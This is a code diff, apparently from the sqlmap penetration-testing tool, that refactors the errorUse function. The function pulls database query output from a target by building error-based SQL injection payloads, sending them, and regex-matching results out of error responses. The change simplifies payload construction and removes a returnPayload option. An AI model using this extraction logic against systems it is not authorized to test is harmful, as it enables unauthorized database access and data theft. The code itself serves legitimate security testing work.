@@ -28,45 +28,37 @@ from lib.utils.resume import resume
 from lib.core.settings import ERROR_SPACE
 from lib.core.settings import ERROR_EMPTY_CHAR
 
-def errorUse(expression, returnPayload=False):
+def errorUse(expression):
     """
     Retrieve the output of a SQL query taking advantage of an error SQL
     injection vulnerability on the affected parameter.
     """
 
-    output         = None
-    logic          = conf.logic
-    randInt        = randomInt(1)
-    query          = agent.prefixQuery(queries[kb.misc.testedDbms].error.query)
-    query          = agent.suffixQuery(query)
-    startLimiter   = ""
-    endLimiter     = ""
+    output = None
+    randInt = randomInt(1)
+    query = agent.cleanupPayload(kb.injection.data[2].epayload)
+    query = agent.prefixQuery(query)
+    query = agent.suffixQuery(query)
+    check = "%s(?P<result>.*?)%s" % (kb.misc.start, kb.misc.stop)
 
     expressionUnescaped = expression
 
-    if kb.dbmsDetected:
-        _, _, _, _, _, _, fieldToCastStr = agent.getFields(expression)
-        nulledCastedField                = agent.nullAndCastField(fieldToCastStr)
+    _, _, _, _, _, _, fieldToCastStr = agent.getFields(expression)
+    nulledCastedField = agent.nullAndCastField(fieldToCastStr)
 
-        if kb.dbms == DBMS.MYSQL:
-            nulledCastedField            = nulledCastedField.replace("AS CHAR)", "AS CHAR(100))") # fix for that 'Subquery returns more than 1 row'
+    if kb.dbms == DBMS.MYSQL:
+        nulledCastedField = nulledCastedField.replace("AS CHAR)", "AS CHAR(100))") # fix for that 'Subquery returns more than 1 row'
 
-        expressionReplaced               = expression.replace(fieldToCastStr, nulledCastedField, 1)
-        expressionUnescaped              = unescaper.unescape(expressionReplaced)
-        startLimiter                     = unescaper.unescape("'%s'" % kb.misc.start)
-        endLimiter                       = unescaper.unescape("'%s'" % kb.misc.stop)
-    else:
-        expressionUnescaped              = kb.misc.handler.unescape(expression)
-        startLimiter                     = kb.misc.handler.unescape("'%s'" % kb.misc.start)
-        endLimiter                       = kb.misc.handler.unescape("'%s'" % kb.misc.stop)
+    expression = expression.replace(fieldToCastStr, nulledCastedField, 1)
+    expression = safeStringFormat(query, expression)
+    expression = unescaper.unescape(expression)
 
-    forgedQuery = safeStringFormat(query, (logic, randInt, startLimiter, expressionUnescaped, endLimiter))
-    debugMsg = "query: %s" % forgedQuery
+    debugMsg = "query: %s" % expression
     logger.debug(debugMsg)
 
-    payload = agent.payload(newValue=forgedQuery)
-    result = Request.queryPage(payload, content=True)
-    match = re.search('%s(?P<result>.*?)%s' % (kb.misc.start, kb.misc.stop), result[0], re.DOTALL | re.IGNORECASE)
+    payload = agent.payload(newValue=expression)
+    reqBody, _ = Request.queryPage(payload, content=True)
+    match = re.search(check, reqBody, re.DOTALL | re.IGNORECASE)
 
     if match:
         output = match.group('result')
@@ -78,7 +70,4 @@ def errorUse(expression, returnPayload=False):
                 infoMsg = "retrieved: %s" % replaceNewlineTabs(output, stdout=True)
                 logger.info(infoMsg)
 
-    if returnPayload:
-        return output, payload
-    else:
-        return output
+    return output
